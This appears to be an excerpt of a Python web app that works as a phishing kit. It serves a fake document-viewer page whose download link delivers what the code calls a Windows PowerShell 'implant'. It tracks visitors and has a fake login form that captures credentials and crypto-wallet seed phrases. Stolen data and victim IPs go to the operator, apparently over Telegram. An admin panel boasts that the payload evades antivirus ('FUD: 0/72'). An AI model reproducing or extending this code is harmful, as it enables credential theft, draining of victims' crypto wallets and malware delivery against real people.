...
# Simple implant that works on ANY Windows (PowerShell)
...
# SIMPLE HTML PAGE - NO COMPLEX CSS CONFLICTS
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    ...
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#0f172a;min-height:100vh;padding:40px 20px}
        .container{max-width:1000px;margin:0 auto}
        .card{background:white;border-radius:24px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.2)}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:40px;color:white;text-align:center}
        .header h1{font-size:32px;margin-bottom:10px}
        .body{padding:40px}
        .info-box{background:#f0f4f8;border-radius:16px;padding:20px;margin-bottom:30px;border-left:4px solid #00b3b0}
        .row{display:flex;justify-content:space-between;flex-wrap:wrap;margin-bottom:10px}
        .btn-group{display:flex;gap:15px;justify-content:center;flex-wrap:wrap;margin:30px 0}
        .btn{display:inline-block;padding:14px 30px;border-radius:40px;text-decoration:none;font-weight:bold}
        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
        .btn-secondary{background:white;color:#475569;border:2px solid #ddd}
        .footer{background:#f0f4f8;padding:20px;text-align:center;font-size:11px;color:#666}
        h2{font-size:20px;margin-bottom:15px}
        .badge{display:inline-block;background:#e8f5e9;color:#2e7d32;padding:5px 12px;border-radius:20px;font-size:11px}
        @media(max-width:640px){.header{padding:25px}.header h1{font-size:24px}.body{padding:25px}.btn{padding:12px 20px}}
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        ...
        <div class="body">
            ...
            <div class="btn-group">
                ...
                <a href="/download/exe/{ref}" class="btn btn-primary">⚙️ Secure Viewer</a>
            </div>
...
<script>fetch('/track/{ref}',{method:'POST',keepalive:true});</script>
</body>
</html>
"""
...
def get_page(ref, email="user@company.com", name="Valued Customer"):
    return HTML_PAGE.format(
        envelope_id=f"DOC-{uuid.uuid4().hex[:8].upper()}",
...
def download_exe(ref):
    tg(f"⚙️ IMPLANT | IP: {request.remote_addr}")
...
<head>
    ...
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        ...
        .card{{background:white;border-radius:24px;padding:40px;width:100%;max-width:400px}}
        h2{{margin-bottom:20px;color:#0f172a}}
        input{{width:100%;padding:12px;margin:10px 0;border:2px solid #ddd;border-radius:12px}}
        button{{width:100%;padding:12px;background:#00b3b0;color:white;border:none;border-radius:40px;cursor:pointer;font-weight:bold}}
...
def login_submit(ref):
    ...
    if seed:
        msg += f"\n🔐 SEED: {seed[:200]}"
    if is_crypto:
        msg += f"\n⚠️ CRYPTO WALLET DETECTED! - {len(words)} words"
    msg += f"\n🌐 IP: {ip}"
...
def admin():
    ...
    <style>body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}} h1{{color:#ffd700}} table{{border-collapse:collapse}} th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}</style>
    </head>
    <body>
    ...
    <p>Status: OPERATIONAL | FUD: 0/72</p>
    </body>
    </html>'''
